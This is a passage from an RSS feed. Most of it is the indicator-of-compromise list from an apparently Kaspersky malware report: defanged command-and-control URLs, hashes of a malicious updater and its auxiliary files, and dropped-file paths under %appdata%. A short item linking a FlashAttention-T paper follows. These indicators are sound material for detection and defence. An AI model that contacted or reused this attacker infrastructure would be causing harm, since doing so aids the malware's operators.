<a href="https://opentip.kaspersky.com/http%3a%2f%2f124.222.137.114%3a9999%2f3yzr31vk/?icid=gl_sl_post-opentip_sm-team_c983bc45ea61bb40&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://124.222.137[.]114:9999/3yZR31VK</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f124.222.137.114%3a9999%2fapi%2fupdatestatus%2fv1/?icid=gl_sl_post-opentip_sm-team_23af04c4ba5e1df9&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://124.222.137[.]114:9999/api/updateStatus/v1</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f124.222.137.114%3a9999%2fapi%2finfo%2fsubmit/?icid=gl_sl_post-opentip_sm-team_347ca4aa29680b17&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://124.222.137[.]114:9999/api/Info/submit</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.wiresguard.com%2fusers%2fsystem/?icid=gl_sl_post-opentip_sm-team_b7dac3255e6c443e&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.wiresguard[.]com/users/system</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.wiresguard.com%2fapi%2fgetinfo%2fv1/?icid=gl_sl_post-opentip_sm-team_faac3436712dbc11&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.wiresguard[.]com/api/getInfo/v1</a></p>
<p>Malicious updater.exe hashes<br>
<a href="https://opentip.kaspersky.com/8e6e505438c21f3d281e1cc257abdbf7223b7f5a/results?icid=gl_sl_post-opentip_sm-team_fc3252034d931e04&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">8e6e505438c21f3d281e1cc257abdbf7223b7f5a</a><br>
<a href="https://opentip.kaspersky.com/90e677d7ff5844407b9c073e3b7e896e078e11cd/results?icid=gl_sl_post-opentip_sm-team_14f98790245926cb&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">90e677d7ff5844407b9c073e3b7e896e078e11cd</a><br>
<a href="https://opentip.kaspersky.com/573549869e84544e3ef253bdba79851dcde4963a/results?icid=gl_sl_post-opentip_sm-team_40e174f1dce982d6&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">573549869e84544e3ef253bdba79851dcde4963a</a><br>
<a href="https://opentip.kaspersky.com/13179c8f19fbf3d8473c49983a199e6cb4f318f0/results?icid=gl_sl_post-opentip_sm-team_6dd7c62c0e6bd7a3&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">13179c8f19fbf3d8473c49983a199e6cb4f318f0</a><br>
<a href="https://opentip.kaspersky.com/4c9aac447bf732acc97992290aa7a187b967ee2c/results?icid=gl_sl_post-opentip_sm-team_889e07a195c9b8cf&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">4c9aac447bf732acc97992290aa7a187b967ee2c</a><br>
<a href="https://opentip.kaspersky.com/821c0cafb2aab0f063ef7e313f64313fc81d46cd/results?icid=gl_sl_post-opentip_sm-team_7f543428bd0bfea0&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">821c0cafb2aab0f063ef7e313f64313fc81d46cd</a></p>
<p>Hashes of malicious auxiliary files<br>
<a href="https://opentip.kaspersky.com/06a6a5a39193075734a32e0235bde0e979c27228/results?icid=gl_sl_post-opentip_sm-team_ff1a7c10c4ae9c07&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">06a6a5a39193075734a32e0235bde0e979c27228</a> — load<br>
<a href="https://opentip.kaspersky.com/9c3ba38890ed984a25abb6a094b5dbf052f22fa7/results?icid=gl_sl_post-opentip_sm-team_ed1b61f041a0a199&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">9c3ba38890ed984a25abb6a094b5dbf052f22fa7</a> — load<br>
<a href="https://opentip.kaspersky.com/ca4b6fe0c69472cd3d63b212eb805b7f65710d33/results?icid=gl_sl_post-opentip_sm-team_0efb43831626b598&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">ca4b6fe0c69472cd3d63b212eb805b7f65710d33</a> — alien.ini<br>
<a href="https://opentip.kaspersky.com/0d0f315fd8cf408a483f8e2dd1e69422629ed9fd/results?icid=gl_sl_post-opentip_sm-team_177bef73d2eb98df&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">0d0f315fd8cf408a483f8e2dd1e69422629ed9fd</a> — alien.ini<br>
<a href="https://opentip.kaspersky.com/2a476cfb85fbf012fdbe63a37642c11afa5cf020/results?icid=gl_sl_post-opentip_sm-team_a38d42b29b7189e9&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">2a476cfb85fbf012fdbe63a37642c11afa5cf020</a> — alien.ini</p>
<p>Malicious file hashes, as previously identified by Rapid7<br>
<a href="https://opentip.kaspersky.com/d7ffd7b588880cf61b603346a3557e7cce648c93/results?icid=gl_sl_post-opentip_sm-team_11d36e3202855002&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">d7ffd7b588880cf61b603346a3557e7cce648c93</a><br>
94dffa9de5b665dc51bc36e2693b8a3a0a4cc6b8<br>
21a942273c14e4b9d3faa58e4de1fd4d5014a1ed<br>
<a href="https://opentip.kaspersky.com/7e0790226ea461bcc9ecd4be3c315ace41e1c122/results?icid=gl_sl_post-opentip_sm-team_296c6f8b3425ef3d&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">7e0790226ea461bcc9ecd4be3c315ace41e1c122</a><br>
<a href="https://opentip.kaspersky.com/f7910d943a013eede24ac89d6388c1b98f8b3717/results?icid=gl_sl_post-opentip_sm-team_d887d29e165f69e8&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">f7910d943a013eede24ac89d6388c1b98f8b3717</a><br>
73d9d0139eaf89b7df34ceeb60e5f8c7cd2463bf<br>
<a href="https://opentip.kaspersky.com/bd4915b3597942d88f319740a9b803cc51585c4a/results?icid=gl_sl_post-opentip_sm-team_f2d4cf981d72f7a7&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">bd4915b3597942d88f319740a9b803cc51585c4a</a><br>
<a href="https://opentip.kaspersky.com/c68d09dd50e357fd3de17a70b7724f8949441d77/results?icid=gl_sl_post-opentip_sm-team_cc1d1d4ce7e25394&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">c68d09dd50e357fd3de17a70b7724f8949441d77</a><br>
<a href="https://opentip.kaspersky.com/813ace987a61af909c053607635489ee984534f4/results?icid=gl_sl_post-opentip_sm-team_e9551e01fbf6d9c9&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">813ace987a61af909c053607635489ee984534f4</a><br>
<a href="https://opentip.kaspersky.com/9fbf2195dee991b1e5a727fd51391dcc2d7a4b16/results?icid=gl_sl_post-opentip_sm-team_e8eb540eaf7ac801&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">9fbf2195dee991b1e5a727fd51391dcc2d7a4b16</a><br>
<a href="https://opentip.kaspersky.com/07d2a01e1dc94d59d5ca3bdf0c7848553ae91a51/results?icid=gl_sl_post-opentip_sm-team_cb0d7f4d17858453&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">07d2a01e1dc94d59d5ca3bdf0c7848553ae91a51</a><br>
<a href="https://opentip.kaspersky.com/3090ecf034337857f786084fb14e63354e271c5d/results?icid=gl_sl_post-opentip_sm-team_0525022e0722b416&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">3090ecf034337857f786084fb14e63354e271c5d</a><br>
<a href="https://opentip.kaspersky.com/d0662eadbe5ba92acbd3485d8187112543bcfbf5/results?icid=gl_sl_post-opentip_sm-team_1f09cef9aa5e7a47&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">d0662eadbe5ba92acbd3485d8187112543bcfbf5</a><br>
<a href="https://opentip.kaspersky.com/9c0eff4deeb626730ad6a05c85eb138df48372ce/results?icid=gl_sl_post-opentip_sm-team_fc30c07aecbf5645&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">9c0eff4deeb626730ad6a05c85eb138df48372ce</a></p>
<p>Malicious file paths<br>
%appdata%\ProShow\load<br>
%appdata%\Adobe\Scripts\alien.ini<br>
%appdata%\Bluetooth\BluetoothService</p>
												</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[FlashAttention-T: Towards Tensorized Attention (112 pts)]]></title>
            <link>https://dl.acm.org/doi/10.1145/3774934.3786425</link>
            <guid>46877403</guid>
            <pubDate>Tue, 03 Feb 2026 21:15:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dl.acm.org/doi/10.1145/3774934.3786425">https://dl.acm.org/doi/10.1145/3774934.3786425</a>, See on <a href="https://news.ycombinator.com/item?id=46877403">Hacker News</a></p>
Couldn't get https://dl.acm.org/doi/10.1145/3774934.3786425: Error: Request failed with status code 403]]></description>
        </item>
    </channel>
</rss>